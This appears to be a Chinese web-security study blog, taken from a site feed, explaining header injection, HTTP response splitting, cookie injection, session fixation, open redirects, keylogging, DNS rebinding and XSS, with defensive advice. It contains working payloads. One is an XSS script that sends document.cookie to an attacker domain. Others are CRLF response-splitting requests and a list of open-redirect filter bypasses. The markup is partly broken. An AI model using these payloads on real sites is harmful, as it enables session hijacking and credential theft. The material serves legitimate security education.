operator">=</span>Chinese HTTP/1.1HOst:mdsec.net</code></pre><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKSet-Cookie:PrefereredLanguage<span class="token operator">=</span>Chinese <span class="token punctuation">..</span>.</code></pre><p>在上述的任何一种情况下，攻击者都可以使用回车符(0x0d)或换行符(0x0a)构造一个专门设计的请求，在他们控制的消息头中注入一个换行符，从而在下面的行中注入其他数据。如：</p><pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aFoo:+bar HTTP/1.1Host: mdsec.net</code></pre><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKSet-Cookie: PrefereredLanguage<span class="token operator">=</span>ChineseFoo: bar<span class="token punctuation">..</span>.</code></pre><h4 id="利用消息头注入漏洞"><a href="#利用消息头注入漏洞" class="headerlink" title="利用消息头注入漏洞"></a>利用消息头注入漏洞</h4><p>如果能够在响应中注入任意消息头和消息主体的内容，那么这种行为可通过各种方式攻击应用程序</p><h5 id="注入cookie"><a href="#注入cookie" class="headerlink" title="注入cookie"></a>注入cookie</h5><p>攻击者可以建立一个URL,在请求它的任何用户的浏览器中设定任意的cookie：</p><pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aSet-Cookie:+sessId%3d120a12f98e8<span class="token punctuation">;</span> HTTP/1.1Host: mdsec.net</code></pre><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKSet-Cookie: PrefereredLanguageSet-Cookie: sessId<span class="token operator">=</span>120a12f98e8<span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre><p>如果进行适当的配置，这些cookie可以访问不同的浏览器会话。这时，通过前面利用反射型XSS漏洞时使用的相同传送机制(电子邮件、第三方Web站点等)，就可以诱使目标用户访问恶意URL。</p><h5 id="传送其他攻击"><a href="#传送其他攻击" class="headerlink" title="传送其他攻击"></a>传送其他攻击</h5><p>因为HTTP消息头注入允许攻击者控制整个响应主体，所以几乎任何针对其他用户的攻击都可以使用它来作为传送机制。</p><h5 id="HTTP响应分隔-HTTP-response-splitting"><a href="#HTTP响应分隔-HTTP-response-splitting" class="headerlink" title="HTTP响应分隔(HTTP response splitting)"></a>HTTP响应分隔(HTTP response splitting)</h5><p>这是一种企图“毒害”代理服务器缓存，从而攻破代理服务器访问应用程序的其他用户的技巧。<br>攻击者可以通过以下步骤，利用消息头注入漏洞来实施响应分割攻击：</p><ol><li>攻击者在代理服务器中选择一个他希望“毒害”的应用程序页面。例如，他可能会使用一个木马登录表单(用于向攻击者的服务器提交用户证书)代替/admin/处的页面</li><li>攻击者确定某个消息头注入漏洞，构造一个请求，在服务器响应中注入一个完整的HTTP主体以及一组响应消息头和另一个消息响应主体。第二个响应主体包含他的木马登录表单的HTML源代码。这样，服务器的响应就像是两个连接起来的单独的HTTP响应。<pre class=" language-bash"><code class="language-bash">GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aContent-Length:+22%0d%0a%0d%0a<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0afoo%0d%0a<span class="token operator">&lt;</span>/html<span class="token operator">></span>%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0a<span class="token operator">&lt;</span>head<span class="token operator">></span>%0a%0a<span class="token operator">&lt;</span>title<span class="token operator">></span>Administrator+login<span class="token operator">&lt;</span>/title<span class="token operator">></span>%0d%0a<span class="token punctuation">[</span><span class="token punctuation">..</span>.long URL<span class="token punctuation">..</span>.<span class="token punctuation">]</span> HTTP/1.1Host: mdsec.net</code></pre><pre class=" language-bash"><code class="language-bash">//第一个响应HTTP/1.1 200 OKSet-Cookie： PrefereredLanguage<span class="token operator">=</span>ChineseContent-Length: 22</code></pre></li></ol><html>foo</html>//第二个响应HTTP/1.1 200 OKContent-Length:2307<html><head><title>Administrator login</title>```<ol start="3"><li><p>攻击者与代理服务器建立TCP连接。传送这个专门设计的请求，后面紧跟着访问被“毒害”的页面的请求。在HTTP中，以这种方式连接请求的方式是合法的</p><pre class=" language-bash"><code class="language-bash">//第一个请求GET /settings/Default.aspx?Language<span class="token operator">=</span>Chinese%0d%0aContent-Length:+22%0d%0a%0d%0a<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0afoo%0d%0a<span class="token operator">&lt;</span>/html<span class="token operator">></span>%0d%0aHTTP/1.1+200+OK%0d%0aContent-Length:+2307%0d%0a%0d%0a<span class="token operator">&lt;</span>html<span class="token operator">></span>%0d%0a<span class="token operator">&lt;</span>head<span class="token operator">></span>%0a%0a<span class="token operator">&lt;</span>title<span class="token operator">></span>Administrator+login<span class="token operator">&lt;</span>/title<span class="token operator">></span>%0d%0a<span class="token punctuation">[</span><span class="token punctuation">..</span>.long URL<span class="token punctuation">..</span>.<span class="token punctuation">]</span> HTTP/1.1Host: mdsec.netProxy-Connection: Keep-alive</code></pre><pre class=" language-bash"><code class="language-bash">//第二个请求GET http://mdsec.net/admin/ HTTP/1.1Host: mdsec.netProxy-Connection: Close </code></pre></li><li><p>代理服务器与应用程序建立TCP连接，送出这两个以相同的方式连接的请求。</p></li><li><p>应用程序用注入的第一个HTTP内容响应第一个请求</p></li><li><p>代理服务器收到这两个看似独立的响应，并认为其中第二个响应与攻击者的第二个请求相对应，该请求指向URL：<a href="http://mdsec.net/admin/" target="_blank" rel="noopener">http://mdsec.net/admin/</a> 。代理服务器把第二个响应作为这个URL的内容保存在缓存中，(如果代理服务器已在缓存中保存有该页面的副本，那么攻击者就可以在他的第二个请求中插入一个适当的<font color="#fb8c00">If-Modified-Since</font>消息头，并在注入的响应中插入一个<font color="#fb8c00">Last-Modified</font>消息头，使得代理服务器重新请求这个URL，用新的内容更新它的缓存)</p></li><li><p>应用程序发布它对攻击者的第二个请求的响应，其中包含URL <a href="http://mdsec.net/admin/" target="_blank" rel="noopener">http://mdsec.net/admin/</a> 的真实内容。代理服务器并不认为它是对用户第二个请求的真实响应，因而抛弃这个响应。</p></li><li><p>一名用户通过代理服务器访问<a href="http://mdsec.net/admin/" target="_blank" rel="noopener">http://mdsec.net/admin/</a> ，并收到这个URL保存在代理服务器缓存中的内容。这个内容实际上是攻击者的木马登录表单，因此用户的证书被攻破。</p></li></ol><h4 id="防止消息头注入漏洞"><a href="#防止消息头注入漏洞" class="headerlink" title="防止消息头注入漏洞"></a>防止消息头注入漏洞</h4><p>要防止HTTP消息头注入漏洞，最有效的方法是杜绝用户控制的输入插入到应用程序返回的HTTP消息头中。如果不可避免地要将消息头插入用户控制的数据中，那么应用程序应采取以下双重深层防御方法防止漏洞的产生：</p><ul><li>输入确认，对插入的数据进行尽可能严格的确认</li><li>输出确认，应对插入到消息头中所有的数据进行过滤，检测可能的恶意字符(实际上，任何ASCII码小于0x20的字符都应被视为可疑字符)<br>只有应用程序在其SSL终止符后未使用缓存反向代理服务器，它才能通过对所有应用程序内容使用HTTPS，防止攻击者利用任何残留的消息头注入漏洞”毒害”代理服务器缓存。</li></ul><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>攻击者可以通过各种方式实施cookie注入攻击</p><ul><li>某些应用程序的功能在请求参数中使用一个名称和值，并在响应cookie中设置该名称和值。保存用户首选项大多属于此功能。</li><li>如果存在HTTP注入漏洞，就可以利用此漏洞注入任意Set-Cookie消息头</li><li>可以利用相关域中的XSS漏洞在目标域上设置一个cookie。目标域的任何子域，以及目标域的父域及其子域，都可以通过这种方式利用</li><li>可以利用中间人攻击(如针对公共无线网络中的用户)在任意域上设置cookie。即使目标应用程序仅使用HTTPS并将其cookie标记为安全。</li></ul><p>如果攻击者可以设置任意cookie，他就可以利用该cookie以各种方式攻击用户：</p><ul><li>在某些应用程序中，设置一个特殊的cookie就可以破坏应用程序的逻辑。如UseHttps=false</li><li>由于cookie通常由应用程序本身设置，因此它们会受到客户端代码的信任。该代码会以危险的方式处理cookie值。</li><li>除将反CSRF令牌与用户会话关联外，一些应用程序还在cookie和请求参数中放置该令牌，然后对它们的值进行比较，以防止CSRF攻击，如果攻击者可以控制cookie和参数值，他就能绕过这种攻击</li><li>攻击者可以利用某个永久性XSS漏洞，通过针对登录功能的CSRF攻击使用户登录攻击者的账户，并因此访问XSS有效载荷。如果登录页面能够有效防范CSRF，那么这种攻击将无效。但是，如果攻击者能够在用户的浏览器中设置任意cookie，他就可以直接向用户传递自己的会话令牌，从而成功实施攻击，而不必实施针对登录的CSRF攻击。</li><li>设置任意的cookie可以对对话固定漏洞加以利用</li></ul><h4 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h4><p>如果应用程序在用户首次访问时为每一名用户建立一个匿名会话，往往就会产生会话固定漏洞。如果应用程序包含登录功能，那么这个会话会在登录之前创建，然后，一旦用户成功登录，这个会话将会升级为通过验证的会话。最初，会话令牌并未被赋予任何访问权限，但用户登录后，这个令牌也就有了用户的访问权限。</p><p>在固定会话攻击中，攻击者从应用程序中直接获得一个匿名令牌，然后使用某种方式将令牌“固定”到用户的浏览器中。用户登录后，攻击者就可以使用该令牌劫持用户会话。<br>攻击过程如下所示<br><img src="https://i.postimg.cc/NfBYvm5w/1.jpg" alt=""></p><p>这个攻击中，最关键的阶段是攻击者向受害者发送他获得的会话令牌，并使受害者浏览器使用这个令牌。实现这一目标的方法因传送会话令牌所采用的机制而异：</p><ul><li><p>如果使用HTTP cookie，攻击者可以尝试使用cookie注入</p></li><li><p>如果在URL参数中传送会话令牌，则攻击者只需向受害者传递应用程序向攻击中发布的同一URL</p></li><li><p>一些应用程序接受在URL中使用分号来分隔会话令牌</p><pre class=" language-bash"><code class="language-bash">httP://wahh-app.com/product.do<span class="token punctuation">;</span>jsessionid<span class="token operator">=</span>739105723F7AEE6ABC213F812C184204.ASTPESD2</code></pre></li><li><p>如果应用程序使用隐藏的表单字段传送会话令牌，攻击者可以通过CSRF攻击在用户的浏览器中拆入他的令牌</p></li></ul><p>并不提供登录机制的应用程序也可能存在会话固定漏洞。</p><h5 id="查找并利用会话漏洞"><a href="#查找并利用会话漏洞" class="headerlink" title="查找并利用会话漏洞"></a>查找并利用会话漏洞</h5><p>在下面两种情况下， 应用程序可能易于受到会话固定攻击：</p><ul><li>应用程序向每名未通过验证的用户发布一个匿名会话令牌</li><li>应用程序只在用户成功登录后才向用户发布会话令牌。如果用户使用通过验证的令牌访问登录功能，并使用不同的证书登录，则应用程序并不发布新令牌；相反，与之前通过验证的会话关联的用户身份将转换为第二名用户的身份</li></ul><p>如果应用程序并不支持验证，但允许用户提交并审查敏感信息，那么应该确认用户在提交敏感信息前后的会话令牌是否发生变化，则攻击者就可以 </p><h5 id="防止会话固定漏洞"><a href="#防止会话固定漏洞" class="headerlink" title="防止会话固定漏洞"></a>防止会话固定漏洞</h5><p>任何时候，只要一名用户与应用程序的交互状态由匿名转变为确认，应用程序就应该发布新的会话令牌。这不仅适用于用户成功登录的情况，也适用于匿名用户首次提交个人或其他敏感信息的情况。下面是一些防止会话固定漏洞的方法：</p><ul><li>采用每页面令牌强化会话令牌</li><li>应用程序不得接受它认为不是自己发布任意会话令牌，应立即在浏览器中取消该令牌，并将用户返回到应用程序起始页。</li></ul><h3 id="开放式重定向漏洞"><a href="#开放式重定向漏洞" class="headerlink" title="开放式重定向漏洞"></a>开放式重定向漏洞</h3><p>如果应用程序提取用户可控制的输入，并使用这个数据执行重定向，指示用户的浏览器访问不同于用户所请求的URL，这时就会导致开放式重定向漏洞。</p><p>攻击者主要利用开放式重定向漏洞实施钓鱼攻击，诱使受害者访问欺骗性的Web网站并输入敏感信息。</p><h4 id="查找并利用开放式重定向漏洞"><a href="#查找并利用开放式重定向漏洞" class="headerlink" title="查找并利用开放式重定向漏洞"></a>查找并利用开放式重定向漏洞</h4><p>查找重定向漏洞的第一步是确认应用程序中的所有重定向。应用程序可以通过以下几种方式使用户的浏览器重定向到不同的URL：</p><ul><li><p>HTTP重定向使用一条状态码为3xx的消息与一个指向重定向目标的Location消息头，如：</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 302 Object movedLocation: http://wahh-app.com/updates.html</code></pre></li><li><p>HTTP Refresh消息头可在固定时间间隔后使用任意URL重新加载某个页面，该间隔可以为(0)，也就是立即触发重定向，如：</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKRefresh: 0<span class="token punctuation">;</span> url<span class="token operator">=</span>http://www.baidu.com</code></pre></li><li><p>HTML的&lt; meta&gt;标签可用于复制任何HTTP消息头的行为，因此可用于重定向：</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKContent-Length: 125</code></pre></li></ul><html><head><me ta http-equiv="refresh" content="0;url=http://www.baidu.com"><meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head></html>```<ul><li>JavaScript的各种API可用于将浏览器重定向到任意URL<pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKContent-Length: 120</code></pre></li></ul><html><head><script> <!--document.location="http://www.baidu.com";</script></head></html>```<h4 id="防止开放式重定向漏洞"><a href="#防止开放式重定向漏洞" class="headerlink" title="防止开放式重定向漏洞"></a>防止开放式重定向漏洞</h4><p>以下这种情况很常见：用户控制的数据用于设置重定向的目标，但却被应用程序以某种方式过滤或净化掉，一阻止重定攻击。因此，接下来应该确认应用程序能否避开防御机制执行任意重定向。通常会遇到以下两种情况：尝试阻止绝对URL，附加一个特殊的绝对URL前缀。</p><h5 id="阻止绝对URL"><a href="#阻止绝对URL" class="headerlink" title="阻止绝对URL"></a>阻止绝对URL</h5><p>应用程序可能会检查用户提交的字符串是否以http://开头，如果是，就阻止该请求。</p><pre class=" language-bash"><code class="language-bash"> HtTp://www. baidu.com%00http://www. baidu.com//www. baidu.com%68%74%74%70%3a%2f%2fwww. baidu.com %2568%2574%2574%2570%253a%252f%252fwww. baidu.comhttps://www. baidu.comhttp:\\www. baidu.comhttps:///www. baidu.com</code></pre><h4 id="防止开放式重定向漏洞-1"><a href="#防止开放式重定向漏洞-1" class="headerlink" title="防止开放式重定向漏洞"></a>防止开放式重定向漏洞</h4><p>绝不将用户提交的数据合并到重定向目标中，是避免开放式重定向漏洞的最有效方法。但我们可以找到替代的方法，可能的替代方法如下：</p><ul><li>从应用程序中删除重定向页面，用直接指向相关目标URL的链接代替指向重定向页面的链接</li><li>建立一个包含所有有效重定向URL的列表。不以参数的形式向重定向页面传送目标URL，而是传送这个列表的索引。重定向页面应在这个列表里查询这个索引，并返回一个指向相关URL的重定向。</li></ul><p>如果重定向页面不可避免地要收到用户提交的输入并将它合并到重定向目标中，应使用以下措施降低重定向攻击的风险。</p><ul><li>应用程序应在所有重定向中使用相对URL，重定向页面应严格确认它收到的URL为相对URL。它应当确保：用户提交的URL或者以其后接一个字母的斜线字符开头，或者以一个字母开头，并且在第一个斜线前没有冒号。如果不满足这些条件，应拒绝该输入而不是净化</li><li>应用程序应该在所有重定向中使用相对于Web根目录的URL，在发布重定向之前，重定向页面应在所有用户提交的URL前附加<a href="http://yourdomainname.com" target="_blank" rel="noopener">http://yourdomainname.com</a> 。如果用户提交的URL并不以斜线字符开头，应在它的签名附加<a href="http://yourdomainname.com/" target="_blank" rel="noopener">http://yourdomainname.com/</a> </li><li>应用程序对所有重定向使用绝对URL，重定向页面在发布重定向页面之前，应确认用户提交的URL以<a href="http://yourdomainname.com/" target="_blank" rel="noopener">http://yourdomainname.com/</a> 开头。此外，应拒绝任何其他输入。</li></ul><p>和基于DOM的XSS漏洞一样，建议应用程序不要根据DOM数据通过客户端脚本执行重定向，因为这些数据不在服务器的直接控制范围内。</p><h3 id="客户端SQL注入"><a href="#客户端SQL注入" class="headerlink" title="客户端SQL注入"></a>客户端SQL注入</h3><ul><li>HTML5支持客户端SQL数据库，应用程序可使用该数据库在客户端存储数据。这些数据库使用JavaScript访问。</li><li>应用程序可以使用该功能将常用数据库存储到客户端，然后在需要的时候将这些数据快速检索到用户界面中。</li><li>该功能还允许应用程序以“离线模式”运行，在这种模式下，所有由应用程序处理的数据将驻留在客户端，用户操作也存储在客户端，以便于在网络连接时可与服务器同步。<br>因此，在客户端也可能会发生SQL注入，下面是一些可能受到这类攻击的应用程序：</li><li>社交网络应用程序，这类应用程序将用户的联系人信息存储在本地数据库中，包括联系人姓名和状态更新。</li><li>新闻应用程序，这类应用程序将文章和用户评论存储在本地数据库中，以便于离线查看</li><li>Web邮件应用程序，这类应用程序将用户的联系人信息存储在本地数据库中，在离线模式下运行时，则存储待发邮件以便于稍后发送。</li></ul><h2 id="攻击浏览器"><a href="#攻击浏览器" class="headerlink" title="攻击浏览器"></a>攻击浏览器</h2><h3 id="记录键击"><a href="#记录键击" class="headerlink" title="记录键击"></a>记录键击</h3><p>JavaScript可在浏览器窗口处于激活状态时监控用户按下的所有键，包括密码、私人信息和其他个人信息。下面的概念验证脚本将截获IE中所有的键击，并在浏览器状态栏中显示全部内容：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>document.onkeypress <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    window.status +<span class="token operator">=</span> String.fromCharCode<span class="token punctuation">(</span>window.event.keyCode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>只有运行上述代码的框架处于激活状态时，这些攻击才能捕获键击。但是，如果在自身页面的框架内嵌入了第三方小组件或广告小程序，某些应用程序可能易于受到键击记录攻击。在“逆向键击劫持”攻击中，在子框架中运行的恶意代码能够夺取顶层窗口的控制权，因为同源策略并不能阻止这种操作。恶意代码通过处理onkeydown事件来捕获键击，并且能够将单独的onkeypress事件传递给顶层窗口。这样，输入的文本仍能在顶层窗口中正常显示。通过在暂停输入时暂时放弃激活状态，恶意代码甚至可以在顶层窗口内的正常位置保留显示闪烁的光标。</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>JavaScript可用于对用户本地网络或其他可访问的网络上的主机进行端口扫描，也确定可被利用的服务。如果用户没有受到防火墙保护，攻击者将能够到达无法通过公共互联网访问的服务。如果攻击者扫描客户端计算机的回环接口，就能够避开用户安装的任何防火墙。</li><li>基于浏览器的端口扫描可用Java applet确定用户的IP地址(可能进行了网络地址转换)，从而推断出本地IP地址的范围。然后，脚本尝试与任意主机和端口进行连接，测试连通性。同源策略将阻止脚本处理这些请求的响应。但是，可以由攻击者的脚本尝试从每个目标主机和端口动态加载并执行一段脚本。如果那个端口上有Web服务器正在运行，它将返回HTML或其他一些内容。生成端口扫描能够检测到的JavaScript错误。否则，连接尝试将会超时或不返回任何数据，在这种情况下不会导致错误。</li></ul><h3 id="DNS重新绑定"><a href="#DNS重新绑定" class="headerlink" title="DNS重新绑定"></a>DNS重新绑定</h3><p>DNS重新绑定(DNS rebinding)是一种在某些情况下可违反同源策略，从而允许恶意Web站点与其他域进行交互的技术。之所以可以实施这种攻击，是因为同源策略主要基于域名进行隔离，而最终传送HTTP请求则需要将域名转换为IP地址。这种攻击的过程如下：</p><ul><li>用户访问攻击者域上的恶意Web网页。为检索这个页面，用户的浏览器会将攻击者的域名解析为攻击者的IP地址。</li><li>攻击者的Web页面向攻击者的域提出Ajax请求(同源策略允许这种行为),攻击者利用DNS重新绑定再次解析攻击者的域，在这次解析过程中，域名将解析为攻击者所针对的第三方应用程序的IP地址。</li><li>针对攻击者的域名提出的请求将被发送到目标应用程序中，由于这些请求与攻击者的原始页面始终在一个域中，因此，同源策略允许攻击者检索目标应用程序返回的请求内容，并将这些内容返回给攻击者。(可能位于收起控制的其他域上)</li><li>在DNS重新绑定攻击中，就浏览器而言，针对目标应用程序的请求仍然在攻击者的域中提出。因此，这些请求不会包含目标应用程序所在域的任何cookie</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(10)</title>
      <link href="/2019/11/09/websecurity10/"/>
      <url>/2019/11/09/websecurity10/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击其他用户"><a href="#攻击其他用户" class="headerlink" title="攻击其他用户"></a>攻击其他用户</h2><p>绝大多数针对Web应用程序的攻击主要以服务器端应用程序为攻击目标，攻击者所使用的基本攻击方法是以无法预料的方式与服务器进行交互的，目的是执行未授权操作并非法访问数据。本篇文章描述的是另一种类型的攻击，在此类攻击中，攻击者的主要对象是应用程序的其他用户。</p><h3 id="跨站点脚本XSS"><a href="#跨站点脚本XSS" class="headerlink" title="跨站点脚本XSS"></a>跨站点脚本XSS</h3><p>跨站点脚本(XSS)导致了针对其他用户的重量级攻击。保存型XSS攻击能攻破最具安全意识的用户，而无须与用户进行任何交互。通常，XSS是一类主要的应用程序安全缺陷，它常常与其他漏洞一起造成破坏性的后果。有时，XSS攻击也可能转变成某种病毒或能够自我繁殖的蠕虫，这种攻击非常严重。</p><h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>XSS漏洞表现为各种形式，并且分为3种类型：反射型、保存型和基于DOM的XSS漏洞。</p><h3 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h3><ul><li>如果一个应用程序采用动态页面向用户显示错误信息，就会造成这种常见的XSS漏洞。通常，该页面会使用一个包含信息文本的参数，并在响应中将这个文本返回给用户。对于开发者而言，使用这种机制非常方便，因为它允许他们从应用程序中调用一个定制的错误页面，而不需要对错误页面中的信息进行硬编码。</li><li>由于利用这种漏洞需要设计一个包含嵌入式javascript代码的请求，随后这些代码又被反射到任何提出请求的用户，因而它被称为反射型XSS漏洞。攻击有效载荷分别通过一个单独的请求和响应进行传送和执行。为此，有时它也称一阶XSS。</li><li>提取用户提交的输入并将其插入到服务器响应的HTML代码中，这是XSS漏洞的一个明显特征。如果应用程序没有实施任何过滤或净化措施，那么它很容易收到攻击。例如，下面的URL经过专门设计，它用一段生成弹出对话框的Javascript代码代替错误信息：<pre class=" language-bash"><code class="language-bash">http://mdsec.net/errors/5/Error/ashx?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre>请求这个URL将会生成一个HTML页面，其中包含以下替代原始消息的脚本：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span></code></pre>message参数的内容可用于任何返回给浏览器的数据替代；无论服务器端应用程序如何处理这些数据，都无法阻止提交javascript代码，一旦错误代码页面在浏览器中显示，这些代码就会执行。</li></ul><h4 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h4><p>利用XSS漏洞攻击应用程序其他用户的方式有很多种，最简单的一种攻击，也就是我们常用于说明XSS漏洞潜在影响的一种攻击，可导致攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。<br>实施反射型XSS攻击的步骤如图：<br><img src="https://i.postimg.cc/4x8X5y4R/1.jpg" alt=""></p><ol><li>用户正常登录应用程序，得到一个包含会话令牌的cookie:<pre class=" language-bash"><code class="language-bash">Set-Cookie: sessId<span class="token operator">=</span>184a138ed37374201a4c9672362f12459c2a652491a3</code></pre></li><li>攻击者通过某种方式向用户提交以下URL：<pre class=" language-bash"><code class="language-bash">http://mdsec.net/error/5/Error.ashx?message<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span>var+i<span class="token operator">=</span>new+Image<span class="token punctuation">;</span>+i.src<span class="token operator">=</span><span class="token string">"http://mdattacker.net/%2bdocument.cookie;&lt;/script>"</span></code></pre>和前面生成一个对话框信息的示例一样，这个URL包含嵌入式的javascript代码。但是，这个示例中的攻击有效载荷更加恶毒。</li><li>用户从应用程序中请求攻击者传送给他们的URL</li><li>服务器响应用户的请求，由于应用程序存在XSS漏洞，响应中包含攻击者创建的JavaScript代码</li><li>用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码。</li><li>攻击者创建的恶意JavaScript代码为：<pre class=" language-bash"><code class="language-bash">var i <span class="token operator">=</span> new image<span class="token punctuation">;</span> i.src<span class="token operator">=</span><span class="token string">"http://mdattacker.net/"</span>+document.cookie<span class="token punctuation">;</span></code></pre>这段代码可让用户浏览器向mdattacker.net(攻击者拥有的一个域)提出一个请求。请求中包含用户访问应用程序的当前会话令牌：<pre class=" language-bash"><code class="language-bash">GET /sessId<span class="token operator">=</span>184a138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1Host: mdattacker.net</code></pre></li><li>攻击者监控访问mdattacker.net的请求并收到用户的请求。攻击者使用截获的令牌劫持用户的会话，从而访问该用户的个人信息，并“代表”该用户执行任意操作。</li></ol><h5 id="使用XSS漏洞的目的"><a href="#使用XSS漏洞的目的" class="headerlink" title="使用XSS漏洞的目的"></a>使用XSS漏洞的目的</h5><p>完成上述步骤后，还有一个问题需要思考：如果攻击者能够诱使用户访问他选择的URL，那么他不直接在mdattacker.net上保存一段恶意脚本，并向用户传送一个直接指向这段脚本的链接呢？这个脚本不是可以和上例中的脚本一起执行吗？要回答这个问题，需要回顾Web安全(2)中介绍的同源策略。为防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源(域)收到的内容进行隔离。攻击者的目的不是单纯地执行任意脚本，而是截获用户令牌。浏览器不允许任何一个旧有脚本访问任何一个站点的cookie，否则，会话就会很容易被劫持。而且，只有发布cookie的站点能够访问这些cookie：仅在返回发布站点的HTTP请求中提交cookie；只有通过该站点返回的页面所包含或加载的javascript才能访问cookie。因此，如果mdattacker.net上的一段脚本查询 document.cookie，它将无法获得mdsec.net发布的cookie，攻击也不会成功。</p><p>就用户的浏览器而言，利用XSS漏洞攻击之所以成功，是因为攻击者的恶意JavaScript是由mdsec.net交给它的。当用户请求攻击者的URL时，浏览器向http:// mdsec.net/error/5/Error.ashx提出一个请求，然后应用程序返回一个包含一段JavaScript的页面。和从mdsec.net收到的任何JavaScript一样，浏览器执行这段脚本，因为用户信任mdsec.net，这就是为何该漏洞被称为跨站点脚本的原因。</p><h3 id="保存型XSS漏洞"><a href="#保存型XSS漏洞" class="headerlink" title="保存型XSS漏洞"></a>保存型XSS漏洞</h3><ul><li>如果一名用户提交的数据被保存在应用程序中(通常保存在一个后端数据库中)，然后不经过适当过滤或净化就显示给其他用户，此时就会出现这种漏洞</li><li>在支持终端用户交互的应用程序中，或者在具有管理员权限的员工访问同一个应用程序中的用户记录和数据的应用程序中，保存型XSS漏洞很常见。</li><li>一般情况下，利用保存型XSS漏洞的攻击至少需要向应用程序提出两个请求。攻击者在第一个请求中传送一些专门设计的数据，其中包含恶意代码，应用程序接受并保存这些数据。在第二次请求中，一名受害者查看某个包含攻击者的数据的页面，这时恶意代码开始执行。为此，这种漏洞有时也叫做二阶跨站点脚本。(在这个示例中，使用XSS实际上不准确，因为攻击中没有跨站点元素，但由于这个名称被人们广泛使用，因此我们在这里仍然沿用它。)<br>攻击步骤如下图所示：<br><img src="https://i.postimg.cc/Wz6vJbYK/2.jpg" alt=""></li></ul><h4 id="反射型与保存型XSS攻击的差别"><a href="#反射型与保存型XSS攻击的差别" class="headerlink" title="反射型与保存型XSS攻击的差别"></a>反射型与保存型XSS攻击的差别</h4><p>反射型和保存型XSS攻击在实施步骤上有两个重要的区别，这也使得后者往往造成更大的安全威胁。</p><ul><li>在反射型XSS脚本攻击中，要利用一个漏洞，攻击者必须以某种方式诱使受害者访问他专门设计的URL，而保存型XSS脚本攻击没有这种要求。在应用程序展开保存型XSS脚本攻击后，攻击者只需等待受害者浏览已被攻破的页面或功能。通常，这个页面是一个正常用户将会主动访问的常规页面。</li><li>如果受害者在遭受攻击时正在使用应用程序，攻击者就更容易实现其利用XSS漏洞的目的。例如，如果用户当前正在进行会话，那么攻击者就可以劫持这个会话。在反射型XSS攻击中，攻击者可能会说服用户登录，然后单击他们提供的一个链接，从而制造这种情况。或者他可能会部署一个永久性的有效载荷并等待用户登录。但是，在保存型XSS攻击中，攻击者能够保证，受害用户在他实施攻击时已经在访问应用程序。因为攻击有效载荷被保存在用户自主访问的一个应用程序页面中，所以，当有效载荷执行时，任何攻击受害者都在使用应用程序。而且，如果上述页面位于应用程序通过验证的区域内，那么那时攻击受害者一定已经登录。</li></ul><h3 id="基于DOM的XSS漏洞"><a href="#基于DOM的XSS漏洞" class="headerlink" 